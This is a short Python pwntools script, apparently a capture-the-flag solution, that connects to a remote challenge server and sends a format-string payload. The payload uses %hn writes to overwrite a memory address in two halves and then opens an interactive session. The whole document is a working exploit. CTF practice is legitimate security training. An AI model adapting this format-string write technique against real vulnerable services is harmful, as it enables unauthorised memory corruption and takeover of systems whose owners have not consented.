from pwn import *
magic = 0x60106c
r = remote('csie.ctf.tw', 10134)
#r = remote('localhost', 31337)
r.sendline("%45068c%10$hn%19138c%11$hn......" + p64(magic) + p64(magic+2))
r.interactive()

